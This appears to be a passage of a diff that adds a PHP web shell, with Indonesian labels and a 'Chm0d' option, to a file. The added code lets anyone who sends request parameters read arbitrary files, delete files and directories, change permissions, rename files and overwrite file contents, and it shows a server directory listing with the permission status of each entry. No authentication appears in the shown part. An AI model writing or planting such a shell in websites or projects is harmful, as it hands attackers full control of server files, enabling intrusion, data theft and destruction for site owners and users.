+    echo "<pre>".htmlspecialchars(@file_get_contents($_GET['fileloc']))."</pre>";
+    author();
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
+    if (is_dir($_POST['path'])) {
+        xrmdir($_POST['path']);
+        if (file_exists($_POST['path'])) red("Failed to delete Directory !");
+        else green("Delete Directory Success !");
+    } elseif (is_file($_POST['path'])) {
+        @unlink($_POST['path']);
+        if (file_exists($_POST['path'])) red("Failed to Delete File !");
+        else green("Delete File Success !");
+    }
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+    echo "<center>".$_POST['path']."<br>";
+    echo '<form method="post">Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', @fileperms($_POST['path'])), -4).'" />
+    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
+    <input type="hidden" name="pilih" value="ubahmod">
+    <input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
+    </form>';
+    if (isset($_POST['chm0d'])) {
+        $cm = @chmod($_POST['path'], intval($_POST['perm'], 8));
+        if ($cm == true) green("Change Mod Success !");
+        else red("Change Mod Failed !");
+    }
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
+    if (isset($_POST['gantin'])) {
+        $ren = @rename($_POST['path'], $_POST['newname']);
+        if ($ren == true) green("Change Name Success !");
+        else red("Change Name Failed !");
+    }
+    $namaawal = empty($_POST['name']) ? $_POST['newname'] ?? '' : $_POST['name'];
+    echo "<center>".$_POST['path']."<br>";
+    echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($namaawal).'" />
+    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
+    <input type="hidden" name="pilih" value="gantinama">
+    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+    </form>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+    if (isset($_POST['gasedit'])) {
+        $edit = @file_put_contents($_POST['path'], $_POST['src']);
+        if ($edit == true) green("Edit File Success !");
+        else red("Edit File Failed !");
+    }
+    echo "<center>".$_POST['path']."<br><br>";
+    echo '<form method="post">
+    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
+    <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
+    <input type="hidden" name="pilih" value="edit">
+    <input type="submit" value="Edit File" name="gasedit" />
+    </form><br>';
+}
+
+// directory & file listing
+echo '<div style="max-width:900px;margin:14px auto;background:#0b0b0b;color:#def;padding:10px;border-radius:8px">';
+echo '<table width="100%" cellpadding="6" cellspacing="1" style="border:1px solid #222">';
+echo '<tr style="background:#132"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td></tr>';
+
+if (is_array($lokasinya)){
+    foreach($lokasinya as $dir){
+        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
+        echo "<tr style='background:#0d1'><td><a href=\"?path=".htmlspecialchars($lokasi."/".$dir)."\">".htmlspecialchars($dir)."</a></td><td><center>--</center></td><td><center>";
+        if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
+        elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
+        echo statusnya($lokasi."/".$dir);
+        if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
+        echo "</center></td><td><center><form method=\"POST\" action=\"?pilihan&path=".htmlspecialchars($lokasi)."\">
+        <select name=\"pilih\"><option value=\"\"></option><option value=\"hapus\">Delete</option><option value=\"ubahmod\">Chm0d</option><option value=\"gantinama\">Rename</option></select>
+        <input type=\"hidden\" name=\"type\" value=\"dir\">
+        <input type=\"hidden\" name=\"name\" value=\"".htmlspecialchars($dir)."\">
+        <input type=\"hidden\" name=\"path\" value=\"".htmlspecialchars($lokasi.'/'.$dir)."\">
+        <input type=\"submit\" class=\"gas\" value=\">\" />
+        </form></center></td></tr>";
+    }
+    echo '<tr style="background:#111"><td></td><td></td><td></td><td></td></tr>';
+    foreach($lokasinya as $file) {
+        if(!is_file("$lokasi/$file")) continue;
+        $size = @filesize("$lokasi/$file")/1024;
+        $size = round($size,3);
+        if($size >= 1024) $size = round($size/1024,2).' MB'; else $size = $size.' KB';
+        echo "<tr><td><a href=\"?fileloc=".htmlspecialchars($lokasi.'/'.$file)."&path=".htmlspecialchars($lokasi)."\">".htmlspecialchars($file)."</a></td>
+        <td><center>".htmlspecialchars($size)."</center></td><td><center>";
+        if(is_writable("$lokasi/$file")) echo '<font color="green">';
+        elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
+        echo statusnya("$lokasi/$file");
+        if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
+        echo "</center></td><td><center>
+        <form method=\"post\" action=\"?pilihan&path=".htmlspecialchars($lokasi)."\">
+        <select name=\"pilih\"><option value=\"\"></option>
+        <option value=\"hapus\">Delete</option><option value=\"ubahmod\">Chm0d</option><option value=\"gantinama\">Rename</option><option value=\"edit\">Edit</option></select>
+        <input type=\"hidden\" name=\"type\" value=\"file\">
+        <input type=\"hidden\" name=\"name\" value=\"".htmlspecialchars($file)."\">
+        <input type=\"hidden\" name=\"path\" value=\"".htmlspecialchars($lokasi.'/'.$file)."\">
+        <input type=\"submit\" class=\"gas\" value=\">\" />
+        </form></center></td></tr>";
+    }
+}
+
+echo '</table></div>';
+
+// akhir
+author();
 ?>
